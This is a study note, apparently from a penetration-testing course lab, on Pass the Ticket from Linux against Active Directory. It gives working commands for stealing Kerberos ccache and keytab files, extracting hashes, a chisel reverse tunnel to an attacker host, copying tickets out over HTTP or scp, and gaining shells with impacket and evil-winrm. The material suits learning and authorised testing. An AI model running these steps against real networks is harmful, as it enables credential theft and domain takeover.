@@ -1,0 +1,860 @@
+---
+title: "Pass the Ticket (PtT) from Linux"
+---
+
+## Overview
+
+Linux systems can be integrated with Active Directory and use Kerberos for authentication just like Windows systems.
+
+The main difference is where Kerberos credentials are stored.
+
+Windows primarily stores Kerberos tickets in LSASS memory, while Linux commonly stores them in files on disk.
+
+If an attacker compromises a Linux machine that participates in Active Directory authentication, they may be able to steal Kerberos material and impersonate users without knowing their passwords.
+
+---
+
+# Which machine runs what (read this first)
+
+The biggest source of confusion in this attack is that the commands run on **different machines**. In the standard lab layout there are four:
+
+| Machine | What it is | Reaches the DC? |
+|---|---|---|
+| **Kali** (attack host) | *Your* box, e.g. `10.10.14.x`. **Not** domain-joined. | ❌ No — can't reach DC01 or LINUX01 directly |
+| **MS01** (pivot) | Windows jump host. You RDP into it. Internal `172.16.1.5`. | ✅ Yes — sits inside the network |
+| **LINUX01** | The domain-joined Linux box you rooted. Internal `172.16.1.15`, reachable only via MS01 (SSH port-forward 2222→22). | ✅ Yes (domain member) |
+| **DC01** | The Domain Controller / KDC — the target. Internal `172.16.1.10`. | — (destination) |
+
+There are **two ways** to use a stolen ticket, and which machine you work on differs:
+
+- **Way 1 — run tools directly on LINUX01.** It's already domain-joined, already reaches DC01, already resolves names. Once you're `root@linux01`: load a ticket (`export KRB5CCNAME=...`) and run `smbclient`/`impacket` *right there*. **No chisel needed.** Simplest.
+- **Way 2 — run tools from your Kali box.** Kali can't reach DC01, so you must tunnel through MS01 (chisel + proxychains) and fake DNS (`/etc/hosts`), then copy the ticket to Kali. More steps; covered in *Using Linux Tickets From an Attack Host* below.
+
+<Info>
+**Prerequisite tooling (`klist`, `kinit`)**
+
+The Kerberos client tools come from the **`krb5-user`** package: `sudo apt install -y krb5-user`. Install prompts — **default realm:** `INLANEFREIGHT.HTB` (uppercase); **Kerberos server / KDC:** `dc01.inlanefreight.htb`; admin server can be the same or blank. You can fix any of these later in `/etc/krb5.conf`. You don't strictly need `klist` to *use* a ticket (tools read `KRB5CCNAME` directly), but it's how you *verify* a ticket loaded and hasn't expired.
+</Info>
+
+---
+
+# Kerberos Artifacts on Linux
+
+There are two important Kerberos artifacts:
+
+1. **ccache files**
+    
+2. **keytab files**
+    
+
+Understanding the difference is critical.
+
+---
+
+## ccache Files
+
+A credential cache (ccache) stores active Kerberos tickets.
+
+When a user authenticates to Active Directory, Kerberos stores the obtained TGT and any requested TGS tickets inside a ccache file.
+
+Think of a ccache file as:
+
+> "A container holding already issued Kerberos tickets."
+
+Because the ticket already exists, an attacker only needs to load the file to start acting as the ticket owner.
+
+### Identify Current ccache
+
+```bash
+env | grep KRB5
+```
+
+Example:
+
+```text
+KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+```
+
+The `KRB5CCNAME` environment variable tells Kerberos-aware tools where the ticket cache is stored.
+
+### Common Location
+
+```bash
+ls -la /tmp
+```
+
+Example:
+
+```text
+-rw------- 1 julio@inlanefreight.htb krb5cc_647401106
+-rw------- 1 david@inlanefreight.htb krb5cc_647401107
+-rw------- 1 carlos@inlanefreight.htb krb5cc_647402606
+```
+
+Each file typically belongs to a logged-in user.
+
+---
+
+## keytab Files
+
+A keytab file does **not** contain tickets.
+
+Instead, it contains Kerberos encryption keys derived from an account's password.
+
+Think of a keytab as:
+
+> "A password replacement that allows Kerberos authentication without typing a password."
+
+Administrators often use keytabs for:
+
+- scheduled tasks
+    
+- automation scripts
+    
+- service accounts
+    
+- backups
+    
+- SMB access
+    
+
+Because the file contains authentication material, anyone possessing the keytab may be able to authenticate as that account.
+
+### Search for Keytabs
+
+```bash
+find / -name "*keytab*" -ls 2>/dev/null
+```
+
+Example:
+
+```text
+/etc/krb5.keytab
+/opt/specialfiles/carlos.keytab
+```
+
+also:
+```bash
+crontab -l
+```
+- to look in cronjobs for keytabs
+---
+
+# Identifying Domain-Joined Linux Hosts
+
+A Linux host integrated with Active Directory is often more valuable because it may contain domain user tickets.
+
+### Check Domain Membership
+
+```bash
+realm list
+```
+
+Example:
+
+```text
+inlanefreight.htb
+  type: kerberos
+  realm-name: INLANEFREIGHT.HTB
+  domain-name: inlanefreight.htb
+  configured: kerberos-member
+  server-software: active-directory
+  client-software: sssd
+  login-policy: allow-permitted-logins
+  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
+  permitted-groups: Linux Admins
+```
+
+This confirms the machine authenticates against Active Directory. It also tells you **who is allowed to log in**, which is often a lab question:
+
+- **`permitted-logins`** — specific *users* allowed to log in (here david, julio).
+- **`permitted-groups`** — the *group* whose members may log in (here **`Linux Admins`**).
+
+If `realm` isn't installed, the same policy lives in SSSD's config:
+
+```bash
+sudo grep -i "access\|allow\|simple" /etc/sssd/sssd.conf   # look for simple_allow_groups / simple_allow_users
+```
+
+---
+
+### Check SSSD / Winbind
+
+```bash
+ps -ef | grep -i "sssd\|winbind"
+```
+
+Common indicators:
+
+```text
+/usr/sbin/sssd
+/usr/libexec/sssd/sssd_be
+```
+
+These services are frequently used for AD integration.
+
+---
+
+# Abusing Keytab Files
+
+A keytab allows us to request tickets as the account associated with the keytab.
+
+The Domain Controller cannot distinguish between:
+
+- the legitimate owner
+    
+- an attacker possessing the same keytab
+    
+
+---
+
+## Identify the Account
+
+Use `klist` to determine which principal the keytab belongs to.
+
+```bash
+klist -k -t carlos.keytab
+```
+
+Output:
+
+```text
+Principal:
+carlos@INLANEFREIGHT.HTB
+```
+
+---
+
+## Request a TGT Using the Keytab
+
+```bash
+kinit carlos@INLANEFREIGHT.HTB -k -t carlos.keytab
+```
+
+Verify:
+
+```bash
+klist
+```
+
+Example:
+
+```text
+Default principal: carlos@INLANEFREIGHT.HTB
+```
+
+We are now operating as Carlos.
+
+---
+
+## Access Resources
+
+Since Kerberos authentication is available:
+
+```bash
+smbclient //dc01/carlos -k -c ls
+```
+
+No password is required because Kerberos already trusts our ticket.
+
+---
+
+# Extracting Hashes From Keytabs
+
+A keytab may contain Kerberos keys that can be extracted and potentially cracked.
+
+Tool:
+
+```bash
+python3 keytabextract.py carlos.keytab
+```
+
+Example output:
+
+```text
+NTLM HASH:
+a738f92b3c08b424ec2d99589a9cce60
+
+AES-256 HASH:
+42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+```
+
+These hashes may be used for:
+
+- Pass the Hash
+    
+- Ticket forging
+    
+- Password cracking
+    
+
+If the password is recovered, full account access becomes possible.
+
+---
+
+# Machine Account Keytabs (impersonating LINUX01$)
+
+Every domain-joined Linux system has a **machine account** in AD (e.g. `LINUX01$`). Its credentials live in the machine keytab, readable **only by root**:
+
+```bash
+/etc/krb5.keytab
+```
+
+Owning this keytab = you can authenticate as the computer account `LINUX01$@INLANEFREIGHT.HTB`. That account can often read machine-specific shares on the DC (e.g. `\\DC01\linux01`).
+
+### Step 1 — Confirm the principal in the keytab
+
+`kinit` is case-sensitive, so read the exact principal name first:
+
+```bash
+klist -k /etc/krb5.keytab
+```
+
+You'll see `LINUX01$@INLANEFREIGHT.HTB` plus some `host/...` SPNs. Use the `LINUX01$@...` one.
+
+### Step 2 — Request a TGT with the keytab
+
+```bash
+kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
+klist     # should now show Default principal: LINUX01$@INLANEFREIGHT.HTB
+```
+
+<Warning>
+**Quote the principal — the `$@` gotcha**
+
+`LINUX01$@INLANEFREIGHT.HTB` contains `$@`, which **bash expands as a special variable**, silently mangling the name so `kinit` does nothing useful. Always wrap a machine-account principal in **single quotes**: `'LINUX01$@INLANEFREIGHT.HTB'`. This is the #1 reason this command appears to fail.
+</Warning>
+
+### Step 3 — Read the share as the machine account
+
+```bash
+smbclient //dc01/linux01 -k -c 'ls' -no-pass                       # list first
+smbclient //dc01/linux01 -k -c 'get flag.txt /tmp/flag.txt' -no-pass
+cat /tmp/flag.txt
+```
+
+<Note>
+**`kinit` overwrites your default cache**
+
+Requesting the LINUX01$ TGT replaces whatever ticket `KRB5CCNAME` pointed at. Back up your current ccache first if you still need it.
+</Note>
+
+### Alternative — use the machine ccache SSSD already maintains
+
+SSSD keeps a live machine TGT on disk; you can point at it directly instead of `kinit`:
+
+```bash
+export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+klist     # Default principal: LINUX01$@INLANEFREIGHT.HTB
+smbclient //dc01/linux01 -k -c 'ls' -no-pass
+```
+
+---
+
+# Abusing ccache Files (Linux Pass the Ticket)
+
+A ccache file already contains valid Kerberos tickets.
+
+Unlike keytabs, we do not need to request a new ticket.
+
+We simply load the existing one.
+
+---
+
+## View Current Ticket
+
+```bash
+klist
+```
+
+---
+
+## Import a Stolen Ticket
+
+As root, copy the victim's ccache file to a path **you control**, then point `KRB5CCNAME` at that **exact same path**. The single most common mistake is a path mismatch — copying the file to one directory but exporting a different path.
+
+```bash
+# Copy to a stable, known filename (don't rely on "." matching where you think you are)
+cp /tmp/krb5cc_647401106_HRJDux /root/julio.ccache
+export KRB5CCNAME=/root/julio.ccache
+klist
+```
+
+Expected:
+
+```text
+Ticket cache: FILE:/root/julio.ccache
+Default principal: julio@INLANEFREIGHT.HTB
+Valid starting       Expires              Service principal
+...                  ...                  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+```
+
+At this point all Kerberos-aware applications will authenticate as Julio.
+
+<Warning>
+**Troubleshooting: "klist: No credentials cache found"**
+
+This is almost always one of three things — all three are why the same steps "work on HTB but not for me":
+
+1. **Path mismatch (most common).** `cp <file> .` copies into your *current* directory. If you're in `/` then `.` is `/`, but if you `export KRB5CCNAME=/root/...` it looks in `/root` and finds nothing. Fix: `cd /root` first, or — better — copy to a full absolute path and point `KRB5CCNAME` at that *exact* path (as above). Check your location with `pwd` if unsure.
+2. **SSSD keeps rotating the caches.** On an SSSD-joined host the ccache filenames change every few minutes (e.g. `krb5cc_647401106_HRJDux` → `..._xXx52K`, timestamps keep updating). A name you saw seconds ago can vanish — that's the `cp: cannot stat ...: No such file or directory` error. Re-run `ls -la /tmp` immediately before copying, grab the freshest file for your target principal, and copy it to a stable name right away so rotation can't pull it out from under you.
+3. **Wrong syntax / expired ticket.** `export KRB5CCNAME =/path` (space after the variable) fails with "not a valid identifier" — no spaces around `=`. And always check `klist`'s **Expires** field: a ticket whose expiry has passed is dead and must be re-harvested.
+</Warning>
+
+<Tip>
+**FILE: prefix**
+
+Some AD-integrated setups store the value as `KRB5CCNAME=FILE:/tmp/krb5cc_...`. When *you* set it for attack tools, use just the **path** (no `FILE:` prefix) — some Impacket versions choke on the prefix.
+</Tip>
+
+---
+
+## Access Resources Using the Ticket
+
+```bash
+smbclient //dc01/C$ -k -no-pass
+```
+
+No password is required — the Kerberos ticket serves as proof of identity. This is the Linux equivalent of Pass the Ticket.
+
+<Note>
+**Save your own ticket first**
+
+Before overwriting `KRB5CCNAME` with a stolen ticket, back up the ccache currently referenced by your own `KRB5CCNAME` so you can restore your session afterward.
+</Note>
+
+---
+
+## smbclient gotchas (reading shares with a ticket)
+
+`smbclient` connects to a **share**, then you operate on **files inside it** — you can't put a file path in the UNC.
+
+```bash
+# WRONG — treats "julio/julio.txt" as a share name → NT_STATUS_BAD_NETWORK_NAME
+smbclient //dc01/julio/julio.txt -k -c get -no-pass
+
+# RIGHT — connect to the share, then get the file (optionally to a local path)
+smbclient //dc01/julio -k -c 'get julio.txt /tmp/julio.txt' -no-pass
+cat /tmp/julio.txt
+```
+
+| Error | Meaning / fix |
+|---|---|
+| `NT_STATUS_BAD_NETWORK_NAME` | The share doesn't exist — you likely included a file path in the UNC, or mistyped the share. Connect to just `//host/share`. |
+| `NT_STATUS_LOGON_FAILURE` / `ACCESS_DENIED` | Auth problem — wrong/expired ticket. Check `klist` shows the right principal and a future Expires. |
+| `NT_STATUS_OBJECT_NAME_NOT_FOUND` | Share is fine but the *file* name is wrong — run `-c 'ls'` first. |
+
+Getting `BAD_NETWORK_NAME` is actually a good sign for your ticket: that error happens *after* authentication (at tree-connect), so Kerberos auth already succeeded — only the share name was wrong.
+
+<Tip>
+**Useful one-liners**
+
+- List a share: `smbclient //dc01/<share> -k -c 'ls' -no-pass`
+- Recurse + download everything: `smbclient //dc01/<share> -k -c 'recurse ON; prompt OFF; mget *' -no-pass`
+</Tip>
+
+---
+
+# Typical Privilege Escalation Chain
+
+A common attack path is:
+
+1. Gain access as a low-privileged user.
+    
+2. Discover a keytab file.
+    
+3. Impersonate a service account.
+    
+4. Recover additional credentials.
+    
+5. Become root.
+    
+6. Read all users' ccache files.
+    
+7. Discover privileged user tickets.
+    
+8. Impersonate privileged users.
+    
+9. Access Windows servers or the Domain Controller.
+    
+
+The Linux machine often becomes a stepping stone into Active Directory.
+
+---
+
+# Checking User Privileges
+
+Once credentials are recovered, determine whether the account has elevated permissions.
+
+Example:
+
+```bash
+sudo -l
+```
+
+Output:
+
+```text
+(ALL) ALL
+```
+
+If allowed:
+
+```bash
+sudo su
+```
+
+Gain root access.
+
+---
+
+# Finding High-Value Users
+
+Once root is obtained:
+
+```bash
+ls -la /tmp
+```
+
+Identify users with active Kerberos tickets.
+
+Example:
+
+```text
+krb5cc_647401106
+krb5cc_647401107
+```
+
+Check group membership:
+
+```bash
+id julio@inlanefreight.htb
+```
+
+Example:
+
+```text
+domain admins
+```
+
+Finding a Domain Admin ticket often leads directly to full domain compromise.
+
+---
+
+# Using Linux Tickets From an Attack Host
+
+Kerberos tickets are portable — a stolen ccache file can be copied to your own attack host and reused. But running Kerberos tools *from your box* (instead of from the compromised LINUX01) has two hard requirements that the lab network deliberately breaks:
+
+- **The ticket must still be valid** (`klist` → check Expires).
+- **Your host must be able to reach the KDC/Domain Controller** (Kerberos uses TCP/UDP 88, plus 445/5985/etc. for the actual service).
+- **Name resolution must work** — this trips people up: Kerberos authenticates against *hostnames* (`dc01.inlanefreight.htb`), never IPs. If `dc01` doesn't resolve, every tool fails even with a perfect ticket.
+
+In a typical engagement your attack host can't reach the internal network or its DNS directly — only the pivot host (MS01) can. So you tunnel through MS01 and fake DNS locally. That's why chisel + proxychains appear here.
+
+<Info>
+**This is really the Pivoting/Tunneling module**
+
+The chisel/proxychains setup below is borrowed from **Pivoting, Tunneling & Port Forwarding** (CPTS module 12). It's included here because PtT-from-an-attack-host can't work without it. Full treatment lives in that module's note (build it when you reach it).
+</Info>
+
+### Step 1 — Build a SOCKS tunnel through the pivot (chisel)
+
+`chisel` creates a tunnel; with `R:socks` the **client** (on the pivot) exposes a SOCKS proxy back on the **server** (your attack host), so your traffic exits from inside the network.
+
+```bash
+# On YOUR attack host — start the chisel server (reverse mode)
+./chisel server --reverse        # listens on 8080, opens a SOCKS proxy on 1080 when a client connects
+```
+
+```cmd
+:: On the PIVOT (MS01) — connect back and offer SOCKS
+c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
+```
+
+### Step 2 — Route tools through the proxy (proxychains)
+
+On Kali the config file is **`/etc/proxychains4.conf`** (not `/etc/proxychains.conf` like the HTB module shows). Edit the `[ProxyList]` at the bottom:
+
+```bash
+sudo nano /etc/proxychains4.conf
+```
+
+```
+[ProxyList]
+# socks4  127.0.0.1 9050      ← comment out the default Tor line
+socks5  127.0.0.1 1080        ← add chisel's SOCKS port
+```
+
+<Warning>
+**The `9050 ... timeout` error**
+
+If proxychains shows `Strict chain ... 127.0.0.1:9050 ... timeout`, it's still using the **default Tor line (port 9050)**, not your chisel proxy on **1080**. You forgot to comment out `socks4 127.0.0.1 9050` (or edited the wrong file). Only the `socks5 127.0.0.1 1080` line should be active.
+</Warning>
+
+### Step 3 — Verify the tunnel is actually up
+
+A `9050`/`1080` timeout can also mean nothing is listening on your SOCKS port. Confirm before going further:
+
+```bash
+ss -tlnp | grep 1080        # should show something LISTENING on 127.0.0.1:1080
+```
+
+If it's empty, the tunnel isn't established — make sure `./chisel server --reverse` is still running on Kali **and** the `chisel.exe client ... R:socks` on MS01 prints **"Connected"** (not retrying).
+
+### Step 4 — Fake DNS with /etc/hosts
+
+Because you can't reach internal DNS, hardcode the names Kerberos needs:
+
+```bash
+# /etc/hosts
+172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
+172.16.1.5  ms01.inlanefreight.htb ms01
+```
+
+### Step 5 — Transfer the ticket from LINUX01 to Kali
+
+The ccache lives on LINUX01 (internal `172.16.1.15`), which Kali can't reach directly — so the transfer rides the **same tunnel**. Two reliable options:
+
+**Option A — HTTP over the tunnel (server on the file's host, pull through proxychains).** The server must run on the machine that *has* the file (LINUX01); the `wget` runs on Kali and must go through proxychains because Kali can't reach the internal IP directly:
+
+```bash
+# [ON LINUX01, as root] copy to a clean dir and serve it
+mkdir /tmp/x && cp /tmp/krb5cc_647401106_8Dt6uj /tmp/x/ && cd /tmp/x
+python3 -m http.server 8080
+```
+```bash
+# [ON KALI] pull it THROUGH the tunnel (note proxychains + the internal IP)
+proxychains wget http://172.16.1.15:8080/krb5cc_647401106_8Dt6uj
+```
+
+**Option B — scp over the existing SSH port-forward (2222 → 22).** The ccache is root-owned, so first hand it to your SSH user on LINUX01:
+
+```bash
+# [ON LINUX01, as root]
+cp /tmp/krb5cc_647401106_8Dt6uj '/home/david@inlanefreight.htb/julio.ccache'
+chown 'david@inlanefreight.htb' '/home/david@inlanefreight.htb/julio.ccache'
+```
+```bash
+# [ON KALI]
+scp -P 2222 'david@inlanefreight.htb@10.129.204.23':'/home/david@inlanefreight.htb/julio.ccache' .
+```
+
+<Warning>
+**Common transfer failures**
+
+- **`Connection refused` / wrong direction:** the HTTP server must be on LINUX01 (it has the file); Kali pulls. Running the server on Kali won't work — and Kali still can't reach LINUX01 without the tunnel.
+- **Port mismatch:** the `python3 -m http.server <port>` and the `wget http://...:<port>` must use the **same** port.
+- **SSSD rotation / expiry:** the `/tmp` ccache names change every few minutes and TGTs expire in ~10 h. `ls -la /tmp` to grab the freshest file, then transfer and use it promptly.
+</Warning>
+
+### Step 6 — Load the ticket and run tools through proxychains
+
+```bash
+export KRB5CCNAME=/tmp/ticket/krb5cc_647401106_8Dt6uj   # full path to the file you pulled; no FILE: prefix
+klist                                        # confirm it loaded and is still valid
+
+proxychains impacket-wmiexec dc01 -k         # -k = use Kerberos; target by NAME, not IP
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+<Warning>
+**Always target by hostname, never IP**
+
+With Kerberos you must use `dc01` / `dc01.inlanefreight.htb`, not `172.16.1.10`. The ticket is bound to the service principal name (e.g. `cifs/dc01.inlanefreight.htb`); hitting an IP makes Kerberos fail to find a matching ticket. This is the #1 reason Kerberos tools "mysteriously" fail from an attack host. (`/etc/hosts` from Step 4 is what makes the name resolve.)
+</Warning>
+
+---
+
+# Using Impacket With Kerberos
+
+Most Impacket tools support Kerberos authentication.
+
+Important:
+
+- Use hostname, not IP address.
+    
+- Use `-k` to tell Impacket to use Kerberos.
+    
+
+Example:
+
+```bash
+impacket-wmiexec dc01 -k -no-pass
+```
+
+Result:
+
+```text
+inlanefreight\julio
+```
+
+Authentication occurred using the Kerberos ticket.
+
+---
+
+# Using Evil-WinRM With Kerberos
+
+Install Kerberos support:
+
+```bash
+sudo apt install krb5-user
+```
+
+Configure:
+
+```bash
+/etc/krb5.conf
+```
+
+Example:
+
+```text
+default_realm = INLANEFREIGHT.HTB
+```
+
+Connect:
+
+```bash
+evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+If the ticket is valid:
+
+```text
+PS C:\Users\julio\Documents>
+```
+
+You now have a WinRM shell as Julio.
+
+---
+
+# Ticket Conversion
+
+Linux commonly uses:
+
+```text
+.ccache
+```
+
+Windows commonly uses:
+
+```text
+.kirbi
+```
+
+Convert ccache to kirbi:
+
+```bash
+impacket-ticketConverter ticket.ccache ticket.kirbi
+```
+
+Convert kirbi to ccache:
+
+```bash
+impacket-ticketConverter ticket.kirbi ticket.ccache
+```
+
+This allows Kerberos tickets to move between Windows and Linux environments.
+
+---
+
+# Linikatz
+
+Linikatz is often called the Linux equivalent of Mimikatz.
+
+Instead of attacking LSASS, it searches Linux Kerberos implementations and extracts available authentication material.
+
+Requires root privileges.
+
+Download:
+
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+chmod +x linikatz.sh
+```
+
+Execute:
+
+```bash
+sudo ./linikatz.sh
+```
+
+Linikatz searches for:
+
+- ccache files
+    
+- keytabs
+    
+- machine account tickets
+    
+- user tickets
+    
+- cached credentials
+    
+
+Example findings:
+
+```text
+/etc/krb5.keytab
+/tmp/krb5cc_647401106
+/tmp/krb5cc_647402606
+```
+
+It also displays active principals:
+
+```text
+Default principal:
+julio@INLANEFREIGHT.HTB
+```
+
+and:
+
+```text
+Default principal:
+svc_workstations@INLANEFREIGHT.HTB
+```
+
+The primary goal is to identify reusable Kerberos credentials and privileged accounts.
+
+---
+
+# Troubleshooting quick reference
+
+Every obstacle from working this attack, in one place:
+
+| Symptom | Cause | Fix |
+|---|---|---|
+| `klist: No credentials cache found` | `KRB5CCNAME` points to a path where the file isn't (e.g. you `cp`'d to `.` while in `/` but exported `/root/...`) | Copy to a full absolute path and export that **exact** path; `pwd` to check where `.` is |
+| `cp: cannot stat 'krb5cc_..._XXXX'` | SSSD rotated the ccache; the random suffix changed | `ls -la /tmp` again, grab the fresh name, copy to a stable filename immediately |
+| `export: not a valid identifier` | Space around `=` (`export KRB5CCNAME =/path`) | No spaces: `export KRB5CCNAME=/path` |
+| `kinit` for a machine account does nothing | bash expanded `$@` in `LINUX01$@...` | Single-quote it: `'LINUX01$@INLANEFREIGHT.HTB'` |
+| proxychains `127.0.0.1:9050 ... timeout` | Still using the default Tor line | Comment out `socks4 ... 9050`, add `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf` |
+| proxychains config "not found" / wrong file | Kali uses `/etc/proxychains4.conf`, not `/etc/proxychains.conf` | Edit the `4` file |
+| Nothing listening on 1080 | chisel tunnel not up | `ss -tlnp \| grep 1080`; restart chisel server (Kali) + client (MS01) until client says "Connected" |
+| `wget` to internal IP hangs/refused | Kali can't reach internal net directly; or server on wrong host | Run `python3 -m http.server` on the box with the file (LINUX01); `proxychains wget` from Kali; match ports |
+| `NT_STATUS_BAD_NETWORK_NAME` | File path in the UNC instead of a share | Connect to `//host/share`, then `-c 'get file'` |
+| Kerberos tool fails from attack host | Targeted an IP, or name won't resolve | Use the **hostname** (`dc01`); add it to `/etc/hosts` |
+| `klist` shows ticket but tools fail with expiry | TGT expired (~10 h lifetime) | Re-harvest a fresh ticket |
+| `Kerberos ticket expired` even on a fresh ticket / KDC reached OK | **Clock skew** — your attack host's time differs from the domain's (HTB labs run on a fixed date, e.g. 2022). Kerberos compares timestamps, so the ticket looks expired | Set your clock into the ticket's `Valid starting`–`Expires` window: `sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"` — or sync to the DC: `sudo ntpdate -u <DC_IP>`. Restore later with `sudo timedatectl set-ntp on` |
+| `KRB_AP_ERR_SKEW` / "clock skew too great" | Same as above, smaller drift (>5 min) | Sync time to the DC before authenticating |
+| `command not found: klist`/`kinit` | Kerberos tools not installed | `sudo apt install -y krb5-user` |
+
+---
+
+# Key Takeaways
+
+- Linux stores Kerberos credentials in files rather than LSASS memory.
+    
+- ccache files contain active Kerberos tickets.
+    
+- keytab files contain Kerberos keys used to request tickets.
+    
+- Stealing a ccache file enables Pass the Ticket.
+    
+- Stealing a keytab allows ticket requests and account impersonation.
+    
+- `/etc/krb5.keytab` represents the Linux machine account.
+    
+- Root access usually means access to all Kerberos material on the host.
+    
+- A Domain Admin ticket found on Linux can lead directly to Active Directory compromise.
